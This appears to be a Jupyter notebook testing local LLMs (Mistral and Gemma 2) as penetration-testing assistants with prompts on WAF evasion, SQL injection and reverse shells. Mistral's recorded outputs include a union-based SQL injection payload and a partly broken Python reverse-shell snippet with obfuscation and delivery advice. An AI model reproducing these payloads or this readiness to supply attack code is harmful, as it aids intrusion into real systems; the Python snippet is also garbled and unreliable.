{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "initial_id",
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2024-10-05T14:59:52.071485Z",
     "start_time": "2024-10-05T14:59:52.068469Z"
    }
   },
   "outputs": [],
   "source": [
    "from src.agent.llm import Ollama\n",
    "from src.agent.tools import TOOLS"
   ]
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "COLAB_URL = 'https://96bb-34-125-112-157.ngrok-free.app/'"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T14:59:52.099970Z",
     "start_time": "2024-10-05T14:59:52.096970Z"
    }
   },
   "id": "1d1e2db0fd635d68",
   "execution_count": 8
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "data": {
      "text/plain": "'gobuster, hashcat, Hydra, Nmap, searchsploit, sqlmap'"
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "available_tools = ', '.join([tool.name for tool in TOOLS])\n",
    "available_tools"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T15:11:14.930944Z",
     "start_time": "2024-10-05T15:11:14.925443Z"
    }
   },
   "id": "29b60a8d7653819a",
   "execution_count": 26
  },
  {
   "cell_type": "markdown",
   "source": [
    "**Messages**"
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "1c4b17077fb1017d"
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "bypass_firewall = \"I need to bypass a WAF using a technique that avoids detection. I've identified a few possibilities like encoding the payload, using a different encoding, or modifying the request headers. However, I need to determine which technique has the highest chance of success for this particular WAF. Is there any way to identify its specific rules or signatures to make an informed decision?\"\n",
    "\n",
    "sql_injection_exploit =  \"I need to exploit a SQL injection vulnerability on the login form of this web application. I've identified the vulnerability using a blind SQL injection technique, but I need to craft a query to extract the database schema and sensitive information from the database. Can you provide me with some advanced SQL injection payloads to achieve this goal, and how can I bypass any potential security measures like input validation and error handling?\"\n",
    "\n",
    "reverse_shell = \"I've found a potential RCE vulnerability in a web application. How can I craft a reverse shell payload using Python that will execute on the server and connect back to my machine on port 4444? I need to bypass any security measures in place like WAFs and ensure the payload remains undetected. I'd also like to know what other techniques are available for delivering the payload, such as encoding or obfuscation.\""
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T15:11:15.463335Z",
     "start_time": "2024-10-05T15:11:15.460335Z"
    }
   },
   "id": "dc6e6eb74e68724e",
   "execution_count": 27
  },
  {
   "cell_type": "markdown",
   "source": [
    "## Mistral"
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "4aff08f68f395d59"
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "mistral = Ollama(model='mistral', client_url=COLAB_URL)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T15:11:17.733335Z",
     "start_time": "2024-10-05T15:11:17.420335Z"
    }
   },
   "id": "8bb479a559403d0",
   "execution_count": 28
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "ms_system_prompt = \"\"\"As a proficient assistant in Penetration Testing, your task is to help an authorized user during a penetration testing assessment of a target system. \n",
    "The user will usually ask you how to do some task or he will tell you the results of some activity; you should always briefly expose your understanding of the required task, one or two sentences should be enough. \n",
    "You should also ask additional details about the target system or the user objective; making questions is important to assist during the Penetration Testing assessment because it makes the user explain its understanding of the target system or objective and makes you give better answers. \n",
    "When it is clear that you have a good understanding of the task you should propose possible solutions; a solutions should be paired with tools to perform it, however note that the user is most comfortable with the following tools: {tools}\n",
    "\n",
    "Guidelines:\n",
    "1. **Ask Questions** to help the user obtain better answers from you.\n",
    "2. **Do not assume any specific context** such as operating system or network setup without asking the user first.\n",
    "3. **Tool Usage** provide example tool usage to solve the task, but let the user provide you the output.\n",
    "4. **Tool Priority** prefer using the tools the user is most comfortable with\"\"\".format(tools=available_tools)\n",
    "\n",
    "ms_user_prompt = \"\"\"{user}\n",
    "\n",
    "Remember to ask questions about the target system/objective.\n",
    "\"\"\""
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T15:19:56.936100Z",
     "start_time": "2024-10-05T15:19:56.931601Z"
    }
   },
   "id": "1db0957d2adfb98a",
   "execution_count": 40
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "ms_conversion_system_prompt = \"\"\"Given a Penetration Testing plan in natural language you should detect the presence of commands to execute in the plan. Extract the commands from the plan and convert them into the provided JSON format.\n",
    "    [\n",
    "        {\"thought\": \"considerations on command execution\", \"command\": \"a single command\"}\n",
    "    ]\n",
    "\n",
    "**Detect Commands:**\n",
    "- Text that would be typed directly into a terminal to perform an action.\n",
    "- Often enclosed within code blocks like: ``` ... ```.\n",
    "- Is something that can be executed programmatically.\n",
    "\n",
    "IMPORTANT: \n",
    "1. If the plan doesn't contain any commands to execute provide an empty list [].\n",
    "\n",
    "\"\"\"\n",
    "\n",
    "ms_conversion_user_prompt = \"\"\"Penetration Testing Plan:\n",
    "{plan}\n",
    "\n",
    "Command Extraction Guidelines:\n",
    "1. Only provide the JSON string\n",
    "2. Provide an empty list if there is nothing to execute.\n",
    "3. If a command contains a placeholder, such as <target>, the command is not valid.\n",
    "4. Accuracy is paramount. Any errors in the extracted commands could have significant consequences.\"\"\""
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T15:19:57.197164Z",
     "start_time": "2024-10-05T15:19:57.193664Z"
    }
   },
   "id": "36a1f9024dcc6a26",
   "execution_count": 41
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " To help you make an informed decision about bypassing the Web Application Firewall (WAF) without detection, it would be beneficial to gather information about its specific rules and signatures. Here are a couple of methods that can assist in identifying the WAF's behavior:\n",
      "\n",
      "1. Fuzzing: Use tools like `gobuster` or `Hydra` to send various payloads and observe how the WAF responds. This will help you identify patterns in its rule-set.\n",
      "2. Request analysis: Analyze the request headers and payloads that are currently bypassing the WAF, as well as those that are being blocked. By comparing the two, you may discover any commonalities or differences that can help determine which encoding or modification technique is most effective.\n",
      "3. Signature database: Check the `searchsploit` database for signatures related to your target application and WAF. These signatures may provide insights into the WAF's specific rules or patterns to look out for.\n",
      "4. Burp Suite: If possible, use Burp Suite's Intruder tool to send a series of payloads and observe the WAF's responses. This can help you identify any potential vulnerabilities or patterns in the WAF's rule-set.\n"
     ]
    }
   ],
   "source": [
    "messages = [\n",
    "    {'role': 'system', 'content': ms_system_prompt},\n",
    "    {'role': 'user', 'content': bypass_firewall},\n",
    "]\n",
    "for chunk in mistral.query(messages):\n",
    "    print(chunk, end='')\n",
    "print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T15:20:05.377321Z",
     "start_time": "2024-10-05T15:19:57.496664Z"
    }
   },
   "id": "b0ad722fdab849d1",
   "execution_count": 42
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " To better assist you in exploiting the SQL injection vulnerability, could you please clarify the following:\n",
      "\n",
      "1. The specific web application you're working with (if known)\n",
      "2. The database management system being used (MySQL, PostgreSQL, Oracle, etc.)\n",
      "3. Any error messages or responses that may indicate potential input validation or error handling mechanisms in place\n",
      "4. If there are any specific tables or columns containing sensitive information you're targeting\n",
      "\n",
      "For crafting advanced SQL injection payloads, I recommend using the following techniques:\n",
      "\n",
      "- Union-based SQL injection (union SQL injection) to extract data from other tables or columns\n",
      "- Blind SQL injection with time-based blind (error-based blind) or out-of-band (response-based blind) techniques to bypass error handling and input validation mechanisms\n",
      "\n",
      "Here's an example of a union-based SQL injection payload in MySQL:\n",
      "\n",
      "```sql\n",
      "' UNION SELECT GROUP_CONCAT(column_name), column2, ... FROM target_table --\n",
      "```\n",
      "You can use tools like sqlmap for automated SQL injection and data extraction. If you prefer manual payload crafting, you can utilize Burp Suite's Intruder or OWASP ZAP's Payload Generator to construct your custom SQL injection payloads. Remember that the user output should always be evaluated to verify the success of the attack and ensure that no unexpected results are produced.\n",
      "\n",
      "In case you encounter any issues during the exploitation, don't hesitate to ask for further assistance!\n"
     ]
    }
   ],
   "source": [
    "messages = [\n",
    "    {'role': 'system', 'content': ms_system_prompt},\n",
    "    {'role': 'user', 'content': sql_injection_exploit},\n",
    "]\n",
    "for chunk in mistral.query(messages):\n",
    "    print(chunk, end='')\n",
    "print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T15:20:14.584526Z",
     "start_time": "2024-10-05T15:20:05.378823Z"
    }
   },
   "id": "5949277c3d384e58",
   "execution_count": 43
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " To craft a reverse shell Python payload that bypasses security measures like WAFs and remains undetected, you can use the `netcat` (nc) command wrapped within a Python script. Here's an example:\n",
      "\n",
      "```python\n",
      "import subprocess, socket, base64\n",
      "\n",
      "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
      "s.connect(('[your_IP_address]', 4444))\n",
      "s.recv(1024)\n",
      "subprocess.call(s.readline().decode(\"utf-noop\").strip().split()[1:])\n",
      "```\n",
      "\n",
      "This script connects to your IP on port 4444, receives commands from the server, and executes them using `subprocess`. To bypass WAFs, you can base64 encode the Python script and decode it when executed.\n",
      "\n",
      "To execute this payload, you'll need to find a way to include it in your exploit. One common method is to embed the encoded Python script within a benign file (e.g., an image or JavaScript) and trick the server into executing it.\n",
      "\n",
      "Here's how you can base64 encode the payload:\n",
      "\n",
      "```bash\n",
      "python3 -c 'import base64; print(base64.b64encode(\"...\").decode())' > payload.txt\n",
      "```\n",
      "\n",
      "Replace `\"...\"` with the path to your Python script above. Then, you can use tools like `gobuster` or `searchsploit` to find potential injection points in the web application where you can upload this file.\n"
     ]
    }
   ],
   "source": [
    "messages = [\n",
    "    {'role': 'system', 'content': ms_system_prompt},\n",
    "    {'role': 'user', 'content': reverse_shell},\n",
    "]\n",
    "for chunk in mistral.query(messages):\n",
    "    print(chunk, end='')\n",
    "print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T15:20:24.657651Z",
     "start_time": "2024-10-05T15:20:14.586025Z"
    }
   },
   "id": "18a19248ff9c1f8c",
   "execution_count": 44
  },
  {
   "cell_type": "markdown",
   "source": [
    "## Gemma 2 9B"
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "2fef5882262a43a3"
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "gemma2 = Ollama(model='gemma2:9b', client_url=COLAB_URL)"
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "63ce2ba2a253a77d"
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "gm2_system_prompt = \"\"\"As a proficient assistant in Penetration Testing, your task is to help an authorized user during a penetration testing assessment of a target system. \n",
    "The user will usually ask you how to do some task or he will tell you the results of some activity; you should always briefly expose your understanding of the required task, one or two sentences should be enough. \n",
    "When it is clear that you have a good understanding of the task you should propose possible solutions; a solutions should be paired with tools to perform it, however note that the user is most comfortable with the following tools: {tools}\n",
    "\n",
    "Guidelines:\n",
    "1. **Ask Questions** to understand the user's context or requirements.\n",
    "2. **Do not assume any specific context** such as operating system or network setup without asking the user first.\n",
    "3. **Tool Usage** provide example tool usage to solve the task, but let the user provide you the output.\n",
    "4. **Tool Priority** prefer using the tools the user is most comfortable with\"\"\".format(tools=available_tools)\n",
    "\n",
    "gm2_user_prompt = \"\"\"{user}\n",
    "\n",
    "Remember, to make sure the objective is clear you can ask questions.\n",
    "\"\"\""
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T15:03:35.996857Z",
     "start_time": "2024-10-05T15:03:35.992858Z"
    }
   },
   "id": "3822a65ecba4328e",
   "execution_count": 22
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "You're aiming to bypass a WAF without triggering its defenses by analyzing its rules and choosing the most effective evasion technique.  Do you have any information about the type of WAF being used (e.g., ModSecurity, OWASP Core Rule Set) or any known vulnerabilities associated with it? \n",
      "\n",
      "Knowing these details could help us narrow down potential techniques and tools. For example, if we know the WAF uses specific signature-based rules, we might focus on encoding techniques that bypass those signatures. \n"
     ]
    }
   ],
   "source": [
    "messages = [\n",
    "    {'role': 'system', 'content': gm2_system_prompt},\n",
    "    {'role': 'user', 'content': bypass_firewall},\n",
    "]\n",
    "for chunk in gemma2.query(messages):\n",
    "    print(chunk, end='')\n",
    "print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T15:04:09.251606Z",
     "start_time": "2024-10-05T15:03:36.914093Z"
    }
   },
   "id": "a6d7852baaa829d9",
   "execution_count": 23
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "I understand you want to exploit a blind SQL injection vulnerability on a login form to extract the database schema and sensitive information.  To give you the most relevant payloads, could you tell me:\n",
      "\n",
      "* **What kind of input field are you targeting?** (e.g., username, password) \n",
      "* **Are there any specific characters or patterns that seem to be filtered by the input validation?**\n",
      "\n",
      "\n",
      "\n",
      "Knowing these details will help me tailor the payloads for maximum effectiveness.  \n",
      "\n",
      "Once I have that information, I can suggest some advanced SQL injection payloads and techniques to bypass potential security measures like input validation and error handling. \n"
     ]
    }
   ],
   "source": [
    "messages = [\n",
    "    {'role': 'system', 'content': gm2_system_prompt},\n",
    "    {'role': 'user', 'content': sql_injection_exploit},\n",
    "]\n",
    "for chunk in mistral.query(messages):\n",
    "    print(chunk, end='')\n",
    "print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T15:04:15.327614Z",
     "start_time": "2024-10-05T15:04:09.252607Z"
    }
   },
   "id": "f002db2a71b5a109",
   "execution_count": 24
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "This sounds interesting!  To help me give you the best advice, could you tell me:\n",
      "\n",
      "* **What kind of web server is running?** (e.g., Apache, Nginx) This will help determine potential vulnerabilities and suitable payload types.\n",
      "* **Do you have any information about the target system's security measures beyond WAFs?**  (e.g., antivirus, intrusion detection systems)\n",
      "\n",
      "\n",
      "Once I have this information, I can provide you with a Python reverse shell payload example tailored to your situation, along with encoding/obfuscation techniques and other delivery methods. \n"
     ]
    }
   ],
   "source": [
    "messages = [\n",
    "    {'role': 'system', 'content': gm2_system_prompt},\n",
    "    {'role': 'user', 'content': reverse_shell},\n",
    "]\n",
    "for chunk in gemma2.query(messages):\n",
    "    print(chunk, end='')\n",
    "print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-05T15:04:21.175881Z",
     "start_time": "2024-10-05T15:04:15.329134Z"
    }
   },
   "id": "214d045977b731a7",
   "execution_count": 25
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [],
   "metadata": {
    "collapsed": false
   },
   "id": "626f71904773a250"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
